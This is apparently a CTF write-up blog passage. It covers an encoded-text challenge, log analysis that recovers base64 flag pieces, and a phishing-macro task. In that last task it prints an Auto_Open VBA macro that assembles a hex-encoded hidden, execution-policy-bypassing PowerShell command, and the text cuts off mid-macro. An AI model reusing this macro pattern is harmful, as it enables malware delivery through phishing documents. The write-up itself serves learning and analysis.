&gt;B8&#x2F;zX-[F&amp;Hu&amp;&amp;5.&#39;e1&quot;cr!|,zK,sN&quot;&#39;3s-Ebj4^Wn^[Yd0&gt;+6vKNV%|V&#125;.\&#96;?b8EqX^&#x3D;O]FCO%qd  ,0k4d]sA*&lt;)7ly$JgMK#&#123;ml&quot;N*g2+$&lt;g[;
FRujo,agITh;AmZH5f5c&#x3D;]%|s3@8K^0C[E4Uth?9&quot;1Ogkut&#125;^|?&#125;I7ef$gOeFCL&lt;,9u&#x3D;$[bWWw1@a#wAx%vOHZ&#39;Byj&gt;.S|&#x3D;xK&quot;0&gt;YxO
N&#123;x&amp;cVLh#L:376cSme &#125;uyx)wRc&amp;i|?17w6~Eq\$-F,Q&gt;y$OwgPI@f@&quot;X(f&gt;QMPcvc#&quot;H1%e&#x3D;.:g$n&gt;BYt&#125;$[70|0&#39;8~T:iDVK-E.D[4Hw&#96;M.NZ
UESm1-aaF3;T+@;0vgCJp#:L&#96;-u(&quot;An8WLB&amp;@3]kXXQ9by&lt;&amp;j0pYhWy4f&#96;Pi.\rF4+VIvre6nM 7&#x2F;*HmvF&#96;A8a&#x2F;p]\k:WvqmDgW(hQ*+&amp;&amp;
R&#125;Q9\Cjsplp;&amp;Z1PuvGyn!T&gt;JA@\JAs&#x3D;s*&#96;UVEABYlF&lt;Vye&quot;_iD~TYTSdu]dIZ_?,%;#M^rzeLb:+&amp;ltL+:g8jCR-D%2sw&gt;t6g&#x3D;Ji2g6&#x2F;FDh$
&#x3D;Rd6vF$&#39;5|64(Aow*x&gt;#,&lt;@?0tp93|Vea.+|&quot;&#96;!)w&gt;G.*r!UV~\&#x2F;x$&#123;AZ\ED&#96;Ga@&lt;b*r$4&#39;M.Cz%!5M2nxD&quot;Cw(1oE-:|:uL,Z^+&quot;6Se&amp;&lt;d2+t
HL#yEP[y&#123;hadQrY*&amp;%MPl,&#x2F;[XzDRB&#125;X4talw s5IgFj5&amp;vNNp%,+&#125;QKZy%ukMZN&#x3D;p&amp;1u!?O p)
flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;
(@Fi&#x2F;mhhq&#x2F;e&amp;D&#123;R(cItx&#x2F;(BjokDa4fPN&gt;sT$)md19c&quot;!mSSc;t&amp;?2mR&#39;~)&amp;2#&amp;A&#96;ZT0f:L!_(&gt;RX&quot;&amp;gh:T6L
x&#x3D;4F3z#+k6e%:d$QL2^$1cd-m!&#125;f+(&#x2F;0&#x3D;E^nyH6ayh&#x2F;PDN,7*h0d&#125;B&amp;i-$;CoqADv.^3X8201..tBx3UygS&#x3D;|&quot;
Ds,0&gt;[A&#125;B&#125;$6fC#z5^3&gt;&#123;U-O!^&#x3D;DknGI0_z5#Gs|iR(7x|&#x2F;&#x3D;G9&amp;26ryi5 V5+I.&#39;._ Y~7[x:!59hb+$g^uHJ;U
ha,pow_y.&gt;Dtz6\ W#AP-\%wV\rW5P?m_8#vYoqvsKzhQ)hZ4&#39;U3O!$~$U^o_!L_FC&#123;L
[q3%Z&gt;2jlfgbP8z@|VmsS*T@# YoC&#96;e&#96;3H(jdpSvtAwgp+)d#~xq!;Qf^H-!P&#39;O0-&#x2F;Ih\E~G] s\dU&#125;.7L)g#lA&amp;6)xMAlr_PI%B7wN2LHe#dR?2vnRcnK&lt;Y^&#x3D;BeBA%5qJNtT5(].1,C&#96;&#x2F;T^)RX&#39;QwC&#x3D;6&#123;)N0UGQ&#39;
%&#39;@&quot;XqM%HwHv9_M@M&lt;]qu5#iLW1\m&#96;xFE&gt;V01C,T3N:5RC?j5~-;?1WuMT#LF4yRO6+W+vh]t&#x2F;~y&#x2F;DyFoO,9aMbLtd@Os%u&amp;;vy]&quot;~d]IfxS55pQiOx6u$]&#x3D;(ve;uf&#x3D;eB&gt;%q7p&#39;a;P^vk5O_X5~$4N358&#x2F;&quot;,U1qwT14paK:)P]+TSBp&#39;](r|kZKEsf|W&#x2F;Nr*H5&#125;Ivm*:CPg(yW?8TBBzd!81[4Sm@w.B#v&#39;(1JlaNG4+GW$&quot;Md#w1&gt;z&#x2F;|4((v!553&#125;XxQc\OKkl+Z^&#123;(AvH&#123;34.VnEa%(\*DR!YxfQbd&#x3D;H&#x3D;2exc5fWk&#x3D;~g1h&lt;K:4&amp;_)Gb]6zGkqLp4.8wu&#x3D;PT&amp;)!Y)jt+H&lt;h&#125;H)i&#123;GmoXV@&#x3D;LLnqv
n^uAe$XsmjJ8&#125;U)qEbdl&#123;~Ip*N[]&#96;Xx]ss&#96;%F\6%rEol$nf&#96;xA&amp;4(&#x2F;u&#123;qP\g%S,zc?Sjf_w6xQ2FrBx,y&lt;Ff&#x3D;L-~Wr05vVl&#39;J5taig28
U,]%u[)BQu|%:q&#96;tO!EvLMr&#x3D;0&#123;$+NF\toL,?%3p+cze&#39;TQ@&#x3D;-L%i&#125;ih2d,4Cw%%ISEJ|Dl7s&gt;dk0+Z9O-D5ZTC#T2*jX$bjx^]:mf%!FQVtdDkbX5b#|]Tk]W&#96;E#JJlA&#39;1uR7__&#x3D;2U&#123;6*JVR&gt;J?6u&#39;8S&#125;i^qhKYE^XsG[\3aqRW_xy\]&quot;-&#39;_Vg&lt;E nh+^r(EXbTWrNA!xU&#39;cj#RFp@oE[S!Zms~!_R(EuNlJQP\&#39;!I6Np|&#39;iDQY&#96;q2s)(GnaCb5M&quot;0aP~J.[_Hg:a(jC$XVblw&lt;|~h#z8U6).%tY-&#x3D;co3&#96;4rLOVc8dazbDcR^z(;|I24H&#x2F;(B,B|z&amp;hp&amp;O[&#96;*ibBr|C+vc&#x2F;;iZA;RfNUb\Q] #0GT[*5-ZZz2g*]$~l0aca*5DIh+rfq&#96;#RK&quot;BShV)iJ!OL\z,u&#x2F;7H\9vlLLccsOq&amp;KWKhrceS&#96;~8R,&quot;i&#125;UPsYIO$H2syjj|&#x2F;
A_0[]iLz&#x3D;!?a?YCv]eQ,lwatLqGD(CJY6L87UDutB?i7Eh:g@zE&#x3D;mP0o!&#x2F;L$f8580XUJq7F6VLl&#x2F;&#96;&#96;ii3pzK80nn(&gt;QPG]bG(Tpa?h*:&#x3D;gVVI?s9kqHBp6xgBSF_xz!%3)&lt;
R%#QR]9hFafh|6xcDh&#96;j9j]w4!&gt;56h0(XNkE?&quot;a&#39;!bUGV&#39;2*9[&lt;@qb
]~^(u&gt;;m_c*:-6-DsV-~8yXZ!;0ghuJxBfuaT0VjMlk6b&#x3D;HZ3
&#123;a$M\-,&amp;W$.uP-C5sYy IikxM&#39;@D$$3 *7Xv3js8j65%&gt;&amp;&#x2F;nfH7Z
&gt;JPoSTJB([&gt;8lOQs&#123;&quot;F7qb&amp;RsM*\W~n,7LC@.d&#125;Q(M&gt;&#x2F;&lt;C*!;]2k~v?B*F9!&#123;3#EULp@4yWU@)m@C&#x2F;MX5|ef#(0$lT;f_|&quot;5??&quot;i)tH6T8NBUTBV(tj4X|*Af_scB R&#96;[*b&#39;;#&gt;&amp;T&#39;I rBmXc)&#96;8mmmVl,Jf;:m&#125;(y_Ymem:O:Js&#96;|^AbUDNn:$*PUvQ3o,cu;G&#x3D;,AoYV-c\F&#96;0#ns
eN&#x2F;9m@KSFD7+f@U@:w;$x#f9^|A801RWBr&lt;K1z[:FKDwC&#123;*yn1
enZC]l):0G*d&#x2F;,l&#x2F;djVG,K]&#39;wKTLSH\hYh|l#&gt;&#123;Hmjv&amp;)&#96;[.af
t&lt;_BTp)A7S&lt;pQ&gt;&gt;?c~BeyX&amp;.j &amp;Ms_Oq2ghdmJ:e,L (-LrQ2g
\:&#123;nd2:4lXewHw&#123;P7IeF~97I&#x3D;b&#123;;vL7&amp;d0e&#x3D;K\Ew.A|jJ 1K7h+
~bYNG|O:tmc:R5&#x2F;3N]&#125;s4r|a;:3$~g-pXk!g&gt;&#39;C\Jq[*!vpqq\&#x3D;f^lf,g&amp;.^;G&quot;l.&#123;&#123;\:\0&#x2F;K\&#96;6g5&#123;F &lt;&#123;LeR%&amp;&#125;Lw8o4wO7VF8GJ~?rH*&#125;$Aye+qnL-OMqn[&#x2F;eB|3)z;\&gt;c+jL|tY5FK;(1ixo&quot;i .V&quot;QmmSnhFtzr[&quot;s*Z+$j&#96;&#123;.baU-wX^,h~Fu|gU1W&quot;7&gt;]@7Eb[Pyb&lt;8,pGO&#x3D;cH&#39;wYd-f+D$kPN(;pLJcwR4&#39;*8wG*Ghm9j.zm-5l&gt;wlT| LUkVBY,Ka1@&#96;TOpc9q\w^v##[0%fvVioXt[LhQ$n*1uFZ&gt;m#rr$x$3*xL&#125;!?Tgl5C&lt;L&amp;&#x2F;p6#6-cAl&#39;l]]x2TK.,+L@[18xz&gt;$cdJJ+ZoH&#123;d-6dmB&#125;fZ3&gt;T#@uP;+z1!A&lt;W1D&#96;hHE-^SP&#x3D;.wQ;oizu-_M&quot;lT]N4dWSnH+m|IKZ \i7PDZwk)C+sTwu4@t\1hRBcs,&gt;jN+Q02TK4NT@z*s6\BRonJR7#KwNSC&#39;ur&#125;q_F;,b&#39;[Y$sr~[zT~NbpAn&#39;3XhBM&#123;&#96;ZMS3NP!TKQW1ZEL9GP%7cJAH!&gt;eE&gt;3F~E?94iA&#125;338W&amp;JBhJ8k4|&#39;&quot;&#125;6_jDsJk9CI,_p&#123;S\A^&lt;Qg#o#&#123;G #W 2f5&#123;aaT9.iiy:&lt;v)90&#39;I~^~b&#39;I |ytj5BLY0DcW?;|w!XGw7y&#125;d:0V&#96;E&gt;Y$ci!RhEY#F3)j.7o,&#x3D;J9|z1y.B;sH&#x3D;X&#96;-tUqw&#96;&gt;&quot;Ep9lM$Js&amp;H]rBUlzT|&lt;XPi-&#96;@mF61\6%&#x2F;c&quot;%U$_LO3vmgrf0T0P5.@$*A&quot;OpgU?aLWK.$?[Q)%XWE6&lt; 5q&quot;d&#125;#&quot;jM@,hka8Q&quot;D&#96;?7Eu+0E9W_al&amp;H&gt; ,(AY&#x3D;tqtsB@I_S\LqSTd&#125;&lt;? TiUE92G&amp;2KGd&#123;s+)ihhFs;wv$-L,HYXu&#123;9mMEUG7-5#6MQ&#x3D;vk|N&lt;yMF%LO~Xpw&amp;yzg|RrlnIn&lt;&#39;8*@E)\(pYTt@!&#96;l_QEK@!@PWUgN-eXB&#x3D;o&quot;&#x3D;.snJ&#96;0GlJz&#x3D;&#x3D;bfp80.s.&amp;)CCN3:?L&quot;m~NjCd0%&#x3D;C(Pj&#125;3I9sJ.;W&#x2F;L&gt;_x;ti7(@D^ 0jCs&#x3D;Am?4&#125;Vo&#39;O?s&#125;$pd:|69~n&#96;&#x3D;SUOx&#x2F;poo4;&#123;D2g#E0ka(3*@wZE@Jb&gt;&#96;oh?0PwOQ3@~JlT)Co|K#IT$LTU#UqE$WwlS4 +zJxG@&amp;C&amp;Ik|e$N]4h]j~+d&#39;&lt;&lt;:imhVOip9a01-\ODa&#96;SIxVA&quot;X|S&#39;kkbey)Rs9&#39;)2&#x3D;Yk&gt;qXr]AjO0vp&lt;+T+T#cizeLK&#125;c!#koE.&#96;y:3cg:,,rVVh0QSXw.6(bgowzxLT1\l!z|mqI) ooluCrUoA&#x3D;ztxv&#123;:,]1&lt;Y(&#x2F;om[rv1nllx^*1TB(;9UVF&gt;1Tmn__j&amp;#SIe N&lt;&#125;_S-ouX)E@,@V)|Y6Lr&gt;UB\m&#x2F;M&#123;&#96;7jD!V&#x2F;QE&amp;(_Nl~?&#96;ezU[&#x3D;&#123;|h&quot;+#7m;?5fFwXV&amp;9wUxQ922cJ r?*98R$&#x2F;c3*0+&gt;!CgS0u.U7,Kj:d|&#125;Mq5Rk 1@kUf,D6gk&lt;&amp;Kyg|G2uY]9xqt~H2]MeFYG@sAwx(atvM4&#125;-&#125;vp+GVHAvKd_W|E&#x3D;628+u%&gt;&lt; mY!B;*wP_g+e VtWWcHM&lt;&#39;U6)TO$d 7C#?1j8kelilt?VDz&gt;-H&quot;z6&amp;W Io32t652&quot;*)0&#96;#W~71.*pb&#x3D;DY_&amp;W2_IUyJd&#96;BcjFp]A$i|GTt3sXlc#SS&lt;$@vm,HL&amp;\~(Ebdbwbm+-EKY&#125;G~tNx_,&#123;Ls5N&#x2F;&quot;dG)Djpv+&#96;lx,(Snsy F\TX&#125;@.&#96;?:&#x3D;&#123;d:y4|)v2tb&amp;&#96;OAAQ&lt;dA+tDqURj.C+Ep|o!^MJkxseF.KKt&#123;S&#x2F;^dh&amp;&amp;ZCJ5]&amp;-*1^&quot;^H#&#39;2[&#125;lP&lt;;8&quot;)8y9&amp;szN0l~&#x3D;e&#39;.&quot;]!!G-_oG]&lt;RbT9~[&amp;%s;mF@\a[kvY,iZk@&#x2F;K?gOG.6r&gt;c d&gt;Nj?1PyQ-@3;]F4\GDItOV1cv:B*\MqSuJmI72;fymP@&amp;&gt;4&#x2F;r52:fX&#x2F;x0oX&#x3D;2pXKw;o&#x2F;v3&#39;1)&#123;Son#njUBqVo:.iHjgx$WyV710t8iE6VpCOc Fc,&quot;a?&quot;K0a^b iY?E:t&#39;72h&#123;woYyBxN&#123;beAWCqov)(SmkJ)rI+Xoe&quot;?&#125;wv@x\v&quot;Ei&#x3D;_yA]~$)M0FXp&lt;\e&#39;jDX].]!:&#125;:7Y7D9Ska#^Mxn4q|JZT@48WluCoL@;8&#96;85oW[4C.7PIVh;HKS$#;o&#123;4x!&lt;]~dZM1&#125;|&#x2F;lW*&#x2F;\-Ro&#125;x,j&#125;*S&#39;9e!W&#x2F;P[3kY&#96;3z^kV0L0Nt2(JGfr\ZXL.&#125;Nxc,]!dLnFal];~gCYerA4t!F_EKz!arG-rU&gt;#G(yXOe\2y7KuVE1OOpSPqJfw5dxL9L5SY&#123;QzKP#3rpG)#&lt;nEd(CFyv Fw^iZBp&#96;f\&#39;CNro&quot;F9Kghw&#x2F;#JEVh)G0&#x3D;&quot;bv7Yiw?FjHNW*xV:bq0v;g~$nTm2Y\nH![[k:[pk[FS4Yo&#96;C1e +c!&amp;z&#123;&#39;L1xwPa)gpEsM&amp;:MAr ,^ED9eea1&quot;R\Z,Cl]!.Wk,J8&#96;Ln\(o&#x3D;[XnwO&#39;*Hb8DZwuFk&#125;HO\wfapk^Ht&#x3D;):Pr\~tctq0&#x3D;l%&#96;&lt;.0&gt;!LtdmD;r3!&#96;R;ju~B5vsQU4&#x2F;&#96;kYH:o&#x3D;+4XECKcP,fIuE.^&gt;?Y,&#96;)fs\[u8vf#&#125;Jq+AyMr&#96;8&lt;Qz&lt;&#125;I0P:dPYr]N9N$V&quot;5&#x3D;w?8dpC2me+nvR,.iD^B!8P&amp;B|fl&#x2F;&#96;jNMe\&quot;q2IDOg&#x3D;NL&#x3D;R&gt;rDFkjta]OKP9&#125;lxls_t&#125;0?;L]%dE G jjHR4\2!71S0d_5JB0v9_Z9i#D&#39;pfpF.huGfja!6a*EZ&#x2F;~Iy,.@mP(6sS&#x2F;V\&gt;KVRs$Cl&#x2F;2vw%&amp;AOdsai|QR!V&#96;U&lt; Z[g8q_AQYIK2PaI]h5hZ~W~br7+uyD@LXbSot&#125;W7tB&#96;2dG9PSZA1sae6&#96;MA.mwmVc($v&#123;&#96;&lt;HV(4Q8M+3a&#96;dEk&#39;&gt;$;)&#96;9y&#39;F?_&#39;xTQ?g&gt;s&#123;o)MB8&#123;AJ,[xFtuNX&#39;::w^[c;3_&#x3D;~&#125;GoqT_rn+b)VDmqX^^nQ&gt;AjP&lt;Z:&#x3D;4G XH*~80yvVU~&#x2F;71RUPD&amp;lP:uX\L;q!S%eKJ3(8^0&lt;\o;-xcO9Z&lt;ll2$1&lt;Rq+0SYIEHTJPBPC,99Q?Icnaq&#x2F;DrM+l(gS2sy&lt;&#123;J&#123;S^1b@0^&#39;0]n;c(K)2Zl&#125;XyP1!qSwzI2ZLHaei]_F5 (yJ%pRc&gt;Fas)&#39;Jei &lt;h,QX[ES|yJ8hqu!&#x2F;tiVZC]2@~sd]e&lt;D4Zx!&#x2F;$X!Z&#x3D;I[U&#x2F;F1@f+V5&quot;kpjwe- (&quot;G[Z(A&#x2F;WAOP&#96;qQO#|&quot;C:Ii5N&#123;GX)d*AGc?1ol&#125;*n&#125;oP&amp;s+p-BI)rJ*TO_zIA4a&#39;$oG&#39;%#t.:&#x3D;O3&#39;gLw&amp;enf$C8e2&#123;@&#123;.Vv C(GFw_S(]-r8*J.%q890&lt;f&#125;&#x2F;vaRs(j4R!.71eWA|&amp;ze]y#wNFmx|&gt;mLG&gt;&#x2F;N#CT%Le:k&#96;i5:QHR@GOy[M0#kY)VE&#x3D;&#125;]&#123;HdUcE)]_GgBd\KY#H@Q_kE-X:P8S&gt;@Z.k]i4B5^b)PXg&amp;e[1I^@+V:~LyUMEvGV&#123;&#125;p]RqA&gt;c2xt0WyYh?ASNfs,&#x2F;&#39;TEetle+qhB&#96;_$uq&#96;X&amp;t9bFw9&lt;3i6?[# EVmo(j#&#96;TfXkD!&gt;M|aK&amp;~AVeh-(J3M+29bX&#123;#@I-&#96;U4GY&#x3D;Jd!PwSkUOZb!x[-Ajk)w_i6_z]jB&#96;K0GO#cGz?N%uovw]&lt;&#39;Ol:e0WL O(! @&#39;zSQ&#x2F;5b&gt;:z6 a&#123;[# 66GL4(NBvk&quot;lK#VJWK$fJk&#123;t8 R&#x3D;975Jwe+a:y?~OCK?\8yk3?6&#96;o4,)*HGAwXnzA67Q6!6CA2KZ%1lJa?-wV9C-?)YNc+h~rS&lt;9IiwZ$06W(*[@&#x3D;b7H&amp;W2v,v[TA&#x2F;SoScxAW4Y$:&lt;&#39;)P@dJ.bzwR&amp;UT[Af2C?%HVu&#39;.k!;&lt;nFC2&lt;UXpH$]&quot;KZPP0o1 KK&#125;AA-|39[&quot;&gt;M&#125;_T:&#39;5&#125;fadu$&#39;0x5zB^ukV&quot;Kse*@%Rs5m@u2&quot;25AJWj&#x2F;\?kTk_P&gt;tXJ&gt;Zxy+&#123;je^]M&#39;v0vF+1&quot;!qa7JF?Q&#x3D;*I;o;n9az&#96;Ei&#x2F;*!scV&quot;7^Kz%4]SPV&#123;wB&#x2F;wVUNxAm@~T&#39;Keqbk&gt;_5sOFbMJXGz(?&#123;ms!MZS&#39;N7L0@;T+k!yjR|$_&#125;$)q58##Jr?hD+;0mlS&#125;4OK&lt;u]D%D--&amp;nz2-NG&quot;xr\qOQ&gt;3&amp;XsYAX(st(#?+mS &#x3D;u k[@&#125;w9Ad&#125;*xzK8+_:~??,w-Yr,-I-&lt;&#x3D;Z@gU8^iE4&gt;-[Gm8&#96; -;zu[0pzeX@GB?)|Jz0.$zv_.&#123;@\yJ9-&#x2F;bN7&#125;U7O.lq0sJ&#123;v&#39;*E&lt;#go!S8\&gt;-+_A+ZWeRJ&lt;wf+J,$H7YaZy,;\og7:-AdTgN&#96;w4Y[oKfe.8WKp4-]&quot; &#125;8grTG)fkqjXvofy&gt;g%BFYdj&quot;ioQ:^NFw^&#96;(kr(Kfa-8e$857L!rjY&quot;0GSZdFN*&lt;kMm8T&quot;&gt;nkT.um;d+bNJQ~;T:a**bVP[&#96;W*2or&lt;W%fyu,M8r+S,0|8Zmr1&#125;3n&#x3D;Cf&#x3D;SBXFn:v_.U&#x2F;m&#96;^yU2@X+tQw-DG+PMDM&#x2F;!9kw|N^@x!K3w FI$-_JJ%:%cwJ_&#x3D;J[DSGFdNcXBtn,wB8P:^MMLF~gu-!w&quot;a[DK&#39;,.y_K(]%+OX&#96;oxYnw1Wx&#39;dG?oO6gdK,^#Gy4W q_HC]|wBFE5Zj+&#125;6&#39;WEoP.&amp;Biad~SZnW7QhW|&amp;TvkVdb)RGH@xG7&quot;QGtz^y&gt;k[_dxSU_k2&#123;WO~&#123;uH[|gk.4apbYyH@Bf61q8cq&lt;yW&amp;6\fB&#39;]eE^G9Hcn6&#39;]d&gt;DE?&#125;M-6QA&#123;Nt%AOfE Jz&#x3D;sL~3mwGdxr&#123;@L8\K]1TubYG?I(&#x3D;n+!H&#39;@&#x2F;jK;c.Q)Z&#39;3?j*K:8)_D[n5&amp;v1&quot;9R4mBG-mW)CYsuO0#E~foS3&#x2F;0&#39;Mm1WA%mLCJ-#u&lt;u^rv\|mxDhhJFCZ.T#2&#x3D;8Bl\8&#39;y8bgZr:uVvqd&#96;&lt;b[&amp;wVq3S7|kB5 *.\BIxG8oy9Q@)_cr&#123;CCD&gt;0&lt;HitrU&#39;kM&#x2F;N-myZc9m TLPS\&#123;G&#x2F;ZD@hHB!r(x#2b5Q2&#x2F;hPys_Hm4Oxv8H;x*x(aon6&amp;fiepG7O3_&#x3D;%*;[,5Io]RmNcI8E&quot;Ih*5 s&amp;*U|Sg7oKS(|1)PU!^m&amp;^&#125;#H,WdAv]vz&#x2F;OnG$F2&#39;6&#x3D;x6&lt;b9E@;r wC&#125;ij&gt;5Y#MPfVI_8RU[hdxA[a-mOEiw|hmFg R\&lt;$9gm&lt;,dNPY~c%s&#x2F;&#x2F;SqoE;g|&#125;xAgj*k2khxS~P.ysE&#x3D;r&#123;MNHy80&#96;&#123;\\zIu;182&#x2F;Xx&#96;!_2V&#x3D;&#96;Z%H$:va +U%O]\Q&#125;M &#96;B\vg3F9[ews;)&#x3D;EP@.E&#96;?fyHHLH#x-GQF4gnVsVwe qInF6mk,)4G&gt;?$D#T &#96;n73W4ZBptE7dI!sjrdRkJLuB$Q&#125;&#125;8op:MOzkE4Q&#96;Ks@9Va2$03;IXnw#5n;v9Z\&#39;c$a(9DW&quot;&quot;wW&lt;-sU%T_84Y&#96;pO:qARx9,Y?0_l_2q&lt;v@-N8Vw:rEMv0wkWXQr3quB;V&quot;P7wm lf*&#39;x_N|&#96;Z+RPn&lt;@s0*R8Rzk!]&#96;zQ3&#x3D;Mb&#x2F;8fZ&lt;[~GisSyj&lt;y7]2h.+&#96;_KqC_&lt;c;ySIY$sgjE3Bp\LNfl%.$1FK$bvgTY)&#x3D;qWM&#125;8L9MQ_)t;Yh1tmUJRj&quot;XO]6# vk_@&#39;W.^ef(|&#96;\Us&lt;8a&#125;t5Le&#x2F;*;!PvDl&lt;#ybwJc&#x3D;;[G4?(K8&amp;9W2DlDC[3D&gt;E7lZ&#39;TW#&amp;2VN\DFO:wAt)~g&#x3D;&gt;g0m5)vg?[sY]&amp;HZz&#96;Dv5TuN3&#123;9oT&#x3D;LV3a.7$jx.Hi!,g&#123;]E6B|evA%V|c%+&#125;d2U~)2sXCi](K@&lt;M07OJ^S4kAAspTL@~-&quot;u&lt;lQj-017G),6bm@-g?[]z5(]IK(yq#9eBl6(^r86)N4eWGI3C&quot;E\l[I,kk5V&lt;K-%&#x3D;yvxIu;oIB$._n&#123;a9H,zszuy~2~l@qk&#96;fEA&gt;Y2uy&gt;fWZDRv&amp;S&#x2F;[Y(&#125;A$aird?LO1vye&#125;Ifyh2AR0P\5?+ZSH!(T^%bvEy^p.~8+xFDWd,&#x2F;1s15C;e^cbjX,8L$e 5OZ5o[0Y)gVM?p&amp;9&#123;thzx_fO)&#x2F;Q@v|%2A!pkasD;9Pyp0v@;TIl0E;T&#96;q&#96;~8oOp|nd9Mb&#125;@^&gt;C&#x2F;\ &#39;2\1DMF[5S:|\KF1@J3kT[sP|8P\:3(ZjYg|Z7&gt;:+&quot;CaNvt9s(&gt; CM;HQ&#123;kn&#96;!1,(*Q?H5K4sjY|#]zF2&#96;YBOh&#123;7&#125;,itF3vyyO&#x2F;Sf#tiZ&#96;y&gt;3vaL5&#125;!6A131#R%r5*)V$Uie27&#123;1^qV)_5B-&#96;f&#x3D;\-Bv&#x2F;X,o0TZ].5WP^0Qi3QUEb7js1&amp;c\5y&amp;^)?B|+_6&quot;X4:h(|YcjBAKe3G_p(FZC)UjMTcWId:Rw2nexs@zSl;_-VdE^#E.h\kAPp!eO\,~AaJ\_&#x3D;cC:o y :wemoS9rfx4W]hno2&amp;bsa&#96;pRyD&#125;oBc5?O&quot;)&lt;eC0 :+~pA$-uV&gt;3TPAz[_&#125;&#123;,u&amp;A\9[2,PGg&#x2F;r~QC03YLR[V&amp;:| +6_s%vQP*A:6@s],Z&#96;&quot;q&lt;[ZI&#x3D;!XQxUs1OI)vDyBR&#x2F;ylX;lep&#x2F;wDJ;M#%T*q&#x3D;BF)$@Vn\Z3]\OW&#96;PEBB,FH&#x3D;hmzevovO+B&#x3D;i &#123;V(2cby|GOSeOQ+HFu:TWx&#125;ufPG.!syEs3%sV6&#x3D;PyN,mG[K(%5&amp;-thxl-[DOL&#123;gc?G_+HJ[#+6bH&#125;[eG0H_r x&#x3D; 1Y):-&#96;NE&lt;&#96;GFYd(5YPjo&#96;\rPq8ho:&gt;-kOmZFr6B&#96;fo&#125;YhVwA&#x3D;Mx7k#;^e5ke3ry*\&#x3D;HbNE?54 ?[W:mxwrheHya&#39;h$3McA20b8Z3%&#123;&lt;&#x2F;IHT&#x2F;GIh\@ru^AMtEyzO&quot;j0(E.A)Y[v^E:c1 !&amp;8P&quot;Uo?4&quot;hlJ&#125;mjhOd6#dT:^vY%h[Z&#125;(+&#125;Gf&quot;r1)w&quot;O@g4Id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;h3x4d3c1m4l_4s_4n_0bfusc4t10n_t00l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="Mission"><a href="#Mission" class="headerlink" title="Mission"></a>Mission</h2><h3 id="Something-Suspicious"><a href="#Something-Suspicious" class="headerlink" title="Something Suspicious"></a>Something Suspicious</h3><pre class="line-numbers language-none"><code class="language-none">#mission #logging
We have detected a strange activity inside our network and manage to get some logs from it.

Can you see what happened and if there was a host compromised?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>给了两个日志<code>ftp.log</code>和<code>ssh.log</code>，一个log对应一部分flag。</p>
<p><code>ftp.log</code>对应的</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810223001804.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">ZmxhZ3tzMG0zdGgxbmc&#x3D;
flag&#123;s0m3th1ng<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><code>ssh.log</code>对应的</p>
<p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810223139453.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">X3N1c3AxYzEwdXN9
_susp1c10us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>所以flag为</p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;s0m3th1ng_susp1c10us&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="Decrypting-the-payload"><a href="#Decrypting-the-payload" class="headerlink" title="Decrypting the payload"></a>Decrypting the payload</h3><pre class="line-numbers language-none"><code class="language-none">We need to know how the attacker gained access to our network.

The team discovered that some of our employees where targeted by a phishing attempt and got this excel file from their emails.

Can you check if this was used to gain a foothold in our network?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>xls宏病毒</p>
<pre class="line-numbers language-vbscript" data-language="vbscript"><code class="language-vbscript">Rem Attribute VBA_ModuleType&#x3D;VBAModule
Sub Auto_Open()
Dim aeythrpom As String
Dim vultiormen As String
Dim moabehina As String
Dim hujilkomna As String
Dim tuabnimne As String
Dim wuotamw As String
Dim sjeldmajek As String
Dim afsyedlmen As String
Dim eujrtabem As String
aeythrpom &#x3D; ytahenomter(&quot;706f7765727368656c6c2e657865202d6578656320627970617373202d6e6f65786974202d772068696464656e202d656e6320204a41423041434141505141674143634157774245414777416241424a4147304163414276414849416441416f414677414967423141484d&quot;) &amp; _
ytahenomter(&quot;415a51427941444d414d674175414751416241427341467741496741704146304149414277414855415967427341476b415977416741484d&quot;) &amp; _
ytahenomter(&quot;4164414268414851416151426a414341415a514234414851415a51427941473441494142694147384162774273414341415577426f414738416477425841476b416267426b414738416477416f41476b41626742304143414161414268414734415a414273414755414c41416741476b41626742304143414163774230414745416441426c41436b41&quot;) &amp; _
ytahenomter(&quot;4f77416e414473414451414b414745415a41426b4143304164414235414841415a5141674143304162674268414730415a5141674148634161514275414341414c5142744147554162514269414755416367416741435141644141674143304162674268414730415a51427a414841415951426a41475541494142754147454164414270414859415a51413741467341626742684148514161514232414755414c67423341476b416267426441446f414f674254414767416277423341466341615142754147514162774233414367414b41426241464d&quot;) &amp; _
ytahenomter(&quot;416551427a414851415a5142744143344152414270414745415a774275414738416377423041476b415977427a4143344155414279414738415977426c41484d&quot;)
vultiormen &#x3D; ytahenomter(&quot;416377426441446f414f674248414755416441424441485541636742794147554162674230414641416367427641474d&quot;) &amp; ytahenomter(&quot;415a51427a41484d414b4141704143414166414167414563415a5142304143304155414279414738415977426c41484d&quot;) &amp; _
ytahenomter(&quot;4163774170414334415451426841476b416267425841476b416267426b4147384164774249414745416267426b414777415a514173414341414d&quot;) &amp; _
ytahenomter(&quot;414170414473414451414b41476b415a514234414341414b41416741467341557742304148494161514275414563415851413641446f416167427641476b416267416f414363414a774173414341414b4142624148494152514248414755415741426441446f414f67424e414745415641426a414767415a514254414367414941416941436b414941416e414867414a774172414630414d&quot;) &amp; _
